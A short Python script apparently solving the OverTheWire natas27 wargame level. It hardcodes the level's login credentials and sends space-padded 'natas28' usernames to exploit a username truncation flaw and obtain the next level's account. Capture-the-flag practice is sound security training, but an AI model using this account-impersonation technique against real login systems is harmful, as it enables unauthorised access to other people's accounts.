

import requests, subprocess

import re
url     = "http://natas27.natas.labs.overthewire.org/"

username = 'natas27'
password = 'PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3'
session=requests.session()

response=session.post(url,data= \
    {"username" : ("natas28    a" ),
     "password" : "anything"},
                      auth=(username,password))
response=session.post(url,data=\
    {"username": "natas28                                                         ",
     "password": "anything"},
                      auth=(username,password))


print(response.text)

